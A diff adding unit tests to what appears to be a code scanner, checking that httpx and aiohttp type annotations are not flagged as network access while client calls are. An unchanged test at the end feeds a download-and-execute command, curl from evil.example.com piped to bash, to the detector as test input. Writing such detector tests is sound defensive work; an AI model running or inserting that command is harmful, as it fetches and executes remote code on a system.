@@ -45,6 +45,42 @@ def test_http_client_code_forms():
         assert detect_http_client(line, "x.py", 1) is not None, line
 
 
+def test_client_symbol_reference_is_not_network_access():
+    """Naming a client symbol makes no request; only a call does."""
+    for line in (
+        "def send(response: httpx.Response) -> None:",
+        "    except httpx.HTTPError as exc:",
+        "client: httpx.Client = None",
+        "typed = cast(httpx.Client, raw)",
+        "raise aiohttp.ClientError from None",
+        "# an ``httpx.Client`` whose lifetime is tied to the OpenAI client",
+    ):
+        assert detect_http_client(line, "x.py", 1) is None, line
+
+
+def test_client_call_and_construction_are_network_access():
+    """The call forms of the same symbols still count (no detection lost)."""
+    for line in (
+        "client = httpx.Client(timeout=5)",
+        "session = requests.Session()",
+        "with httpx.stream('GET', url) as resp:",
+        "conn = aiohttp.ClientSession()",
+        "resp = httpx.Response(200, content=b'')",
+    ):
+        assert detect_http_client(line, "x.py", 1) is not None, line
+
+
+def test_client_import_still_carries_the_file_level_claim():
+    """Dropping annotation lines must not lose the file's network capability."""
+    findings = [
+        detect_http_client(line, "x.py", i)
+        for i, line in enumerate(
+            ["import httpx", "def send(r: httpx.Response) -> None:"], 1
+        )
+    ]
+    assert [f is not None for f in findings] == [True, False]
+
+
 def test_download_execute():
     f = detect_download_execute("curl https://evil.example.com/x.sh | bash", "x.sh", 1)
     assert f is not None
